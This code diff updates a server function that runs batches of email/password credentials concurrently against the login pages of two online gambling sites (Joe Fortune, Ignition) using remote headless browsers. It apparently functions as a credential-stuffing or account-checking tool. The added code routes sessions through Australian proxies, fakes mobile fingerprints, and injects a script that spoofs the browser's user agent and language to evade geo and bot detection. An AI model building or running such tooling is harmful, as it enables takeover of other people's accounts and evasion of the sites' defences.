@@ -13,11 +13,16 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';
 
 const BB_BASE = 'https://api.browserbase.com/v1';
-const MAX_ATTEMPTS = 3;
+const MAX_ATTEMPTS = 4;
+const AU_MOBILE_INIT_SCRIPT = `
+  Object.defineProperty(navigator, 'userAgent', { get: () => 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1' });
+  Object.defineProperty(navigator, 'language', { get: () => 'en-AU' });
+  Object.defineProperty(navigator, 'languages', { get: () => ['en-AU','en-GB','en'] });
+`;
 
 const SITES = {
   joe: {
-    url: 'https://www.joefortunepokies.win/login',
+    url: 'https://www.joefortunepokies.eu/login',
     selectors: { username: '#username', password: '#password', submit: '#loginSubmit' },
   },
   ignition: {
@@ -189,7 +194,7 @@ async function waitForOutcome(cdp, sessionId, attempt) {
 }
 
 // ── process one credential ─────────────────────────────────────────────────
-async function processCredential({ cred, batchId, apiKey, projectId, base44, proxy, proxySource }) {
+async function processCredential({ cred, batchId, apiKey, projectId, base44, proxy, proxySource, auMobile }) {
   const rowPatch = {
     batchId, email: cred.email, status: 'running',
     attempts: 0, startedAt: new Date().toISOString(),
@@ -207,8 +212,11 @@ async function processCredential({ cred, batchId, apiKey, projectId, base44, pro
   try {
     const sessionBody = {
       projectId,
-      browserSettings: { viewport: { width: 1366, height: 768 } },
-      userMetadata: { launchedFrom: 'BBCommandCenter', testRun: 'joe_ignite', task: 'login-verify', email: cred.email, batchId, proxySource, proxyId: proxy?.id },
+      region: auMobile ? 'ap-southeast-1' : undefined,
+      browserSettings: auMobile
+        ? { viewport: { width: 390, height: 844 }, fingerprint: { devices: ['mobile'], locales: ['en-AU', 'en-GB', 'en'] } }
+        : { viewport: { width: 1366, height: 768 } },
+      userMetadata: { launchedFrom: 'BBCommandCenter', testRun: 'joe_ignite', task: 'login-verify', email: cred.email, batchId, proxySource, proxyId: proxy?.id, auMobile },
     };
     if (proxySource === 'bb-au') {
       sessionBody.proxies = [{ type: 'browserbase', geolocation: { country: 'AU' } }];
@@ -228,6 +236,14 @@ async function processCredential({ cred, batchId, apiKey, projectId, base44, pro
       const { targetId: ignTargetId } = await cdp.send('Target.createTarget', { url: 'about:blank' });
       const joeSess = await attach(cdp, joeTargetId);
       const ignSess = await attach(cdp, ignTargetId);
+      if (auMobile) {
+        for (const sess of [joeSess, ignSess]) {
+          await cdp.send('Page.enable', {}, sess);
+          await cdp.send('Page.addScriptToEvaluateOnNewDocument', { source: AU_MOBILE_INIT_SCRIPT }, sess);
+          await cdp.send('Network.enable', {}, sess);
+          await cdp.send('Network.setExtraHTTPHeaders', { headers: { 'Accept-Language': 'en-AU,en-GB;q=0.9,en;q=0.8' } }, sess);
+        }
+      }
 
       const run = async (siteKey, sess, attempt) => {
         const cfg = SITES[siteKey];
@@ -298,7 +314,7 @@ Deno.serve(async (req) => {
     const user = await base44.auth.me();
     if (!user) return Response.json({ error: 'Unauthorized' }, { status: 401 });
 
-    const { credentials, concurrency = 4, batchId, projectId, proxySource = 'none' } = await req.json();
+    const { credentials, concurrency = 4, batchId, projectId, proxySource = 'bb-au', auMobile = true } = await req.json();
     const apiKey = Deno.env.get('Api_key');
     if (!apiKey) return Response.json({ error: 'Api_key secret not configured' }, { status: 400 });
     if (!projectId) return Response.json({ error: 'projectId required' }, { status: 400 });
@@ -336,7 +352,7 @@ Deno.serve(async (req) => {
       while (queue.length) {
         const item = queue.shift();
         if (!item) return;
-        try { await processCredential({ cred: item.cred, batchId, apiKey, projectId, base44, proxy: item.proxy, proxySource }); }
+        try { await processCredential({ cred: item.cred, batchId, apiKey, projectId, base44, proxy: item.proxy, proxySource, auMobile }); }
         catch (err) { console.error(`row failed ${item.cred.email}: ${err.message}`); }
       }
     });
